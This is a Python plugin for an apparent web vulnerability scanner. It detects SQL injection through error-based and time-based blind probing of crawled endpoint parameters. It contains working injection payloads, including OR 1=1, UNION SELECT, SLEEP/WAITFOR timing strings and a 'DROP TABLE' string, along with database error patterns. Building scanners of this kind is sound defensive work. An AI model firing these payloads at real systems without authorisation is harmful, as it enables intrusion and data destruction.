"""SQL Injection detection plugin."""

import time
import re
from typing import List, Optional
import httpx

from plugins.base import BasePlugin
from core.models import Finding, CrawledEndpoint, SeverityLevel, AttackType, AttackPrimitive


# Error patterns indicating SQL injection
SQL_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"supplied argument is not a valid MySQL",
    # PostgreSQL
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"valid PostgreSQL result",
    r"ERROR:\s+syntax error at or near",
    r"unterminated quoted string",
    # MSSQL
    r"microsoft sql native client error",
    r"mssql_query\(\)",
    r"unclosed quotation mark after the character string",
    r"microsoft OLE DB provider for SQL Server",
    # Oracle
    r"ORA-\d{5}",
    r"oracle error",
    r"quoted string not properly terminated",
    # SQLite
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"near \".*?\": syntax error",
    r"SQLITE_ERROR",
    r"unrecognized token",
    # Generic
    r"sql syntax.*error",
    r"syntax error.*sql",
    r"invalid query",
    r"ODBC.*Driver",
    r"JDBC.*Driver",
    r"SQL command not properly ended",
]

# Injection payloads
ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1'--",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "1; DROP TABLE test--",
    "' AND 1=CONVERT(int, @@version)--",
    "') OR ('1'='1",
]

TIME_PAYLOADS = [
    ("' AND SLEEP(5)-- ", 5),
    ("' OR SLEEP(5)-- ", 5),
    ("'; WAITFOR DELAY '0:0:5'-- ", 5),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ", 5),
    ("1' AND pg_sleep(5)-- ", 5),
]


class SQLiPlugin(BasePlugin):
    name = "sqli"
    description = "SQL Injection detection (error-based + time-based blind)"

    async def detect(
        self,
        endpoint: CrawledEndpoint,
        session: httpx.AsyncClient,
        context: Optional[dict] = None,
    ) -> List[Finding]:
        findings = []

        # Get parameters to test
        params_to_test = {}
        if endpoint.params:
            params_to_test.update(endpoint.params)
        if endpoint.form_data:
            params_to_test.update(endpoint.form_data)

        if not params_to_test:
            # Test URL path segments with numeric values
            import re as re_mod
            path_segments = re_mod.findall(r'/(\d+)', endpoint.url)
            if path_segments:
                params_to_test["__path_id__"] = path_segments[-1]

        for param_name, original_value in params_to_test.items():
            # ── Error-based SQLi ──
            error_finding = await self._test_error_based(
                session, endpoint, param_name, original_value
            )
            if error_finding:
                findings.append(error_finding)
                continue  # Skip time-based if error-based confirmed

            # ── Time-based blind SQLi ──
            time_finding = await self._test_time_based(
                session, endpoint, param_name, original_value
            )
            if time_finding:
                findings.append(time_finding)

        return findings

    async def _test_error_based(
        self,
        session: httpx.AsyncClient,
        endpoint: CrawledEndpoint,
        param_name: str,
        original_value: str,
    ) -> Optional[Finding]:
        """Test for error-based SQL injection."""
        for payload in ERROR_PAYLOADS:
            test_value = str(original_value) + payload

            # Build request
            if param_name == "__path_id__":
                test_url = re.sub(r'/\d+', f'/{test_value}', endpoint.url, count=1)
                response = await self._send_request(session, test_url)
            elif endpoint.method == "POST" and endpoint.form_data:
                data = dict(endpoint.form_data)
                data[param_name] = test_value
                response = await self._send_request(
                    session, endpoint.url, method="POST", data=data
                )
            else:
                params = dict(endpoint.params)
                params[param_name] = test_value
                response = await self._send_request(
                    session, endpoint.url, params=params
                )

            if response is None:
                continue

            body = response.text.lower()
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    return Finding(
                        vuln_type=AttackType.SQLI,
                        severity=SeverityLevel.HIGH,
                        url=endpoint.url,
                        method=endpoint.method,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"SQL error pattern matched: {pattern}",
                        description=f"Error-based SQL injection detected in parameter '{param_name}'",
                        cvss_score=8.6,
                        owasp_category="A03:2021 - Injection",
                        primitive=AttackPrimitive.DATA_ACCESS,
                    )

        return None

    async def _test_time_based(
        self,
        session: httpx.AsyncClient,
        endpoint: CrawledEndpoint,
        param_name: str,
        original_value: str,
    ) -> Optional[Finding]:
        """Test for time-based blind SQL injection."""
        # Get baseline response time
        start = time.time()
        if endpoint.method == "POST" and endpoint.form_data:
            await self._send_request(session, endpoint.url, method="POST", data=endpoint.form_data)
        else:
            await self._send_request(session, endpoint.url, params=endpoint.params)
        baseline = time.time() - start

        for payload, sleep_time in TIME_PAYLOADS[:3]:  # Test first 3 payloads
            test_value = str(original_value) + payload

            if endpoint.method == "POST" and endpoint.form_data:
                data = dict(endpoint.form_data)
                data[param_name] = test_value
                start = time.time()
                response = await self._send_request(
                    session, endpoint.url, method="POST", data=data, timeout=sleep_time + 5
                )
            else:
                params = dict(endpoint.params) if endpoint.params else {}
                params[param_name] = test_value
                start = time.time()
                response = await self._send_request(
                    session, endpoint.url, params=params, timeout=sleep_time + 5
                )

            elapsed = time.time() - start

            if response and elapsed >= (sleep_time - 1) and elapsed > baseline * 3:
                return Finding(
                    vuln_type=AttackType.SQLI,
                    severity=SeverityLevel.HIGH,
                    url=endpoint.url,
                    method=endpoint.method,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Response delayed by {elapsed:.1f}s (baseline: {baseline:.1f}s)",
                    description=f"Time-based blind SQL injection detected in parameter '{param_name}'",
                    cvss_score=8.6,
                    owasp_category="A03:2021 - Injection",
                    primitive=AttackPrimitive.DATA_ACCESS,
                )

        return None
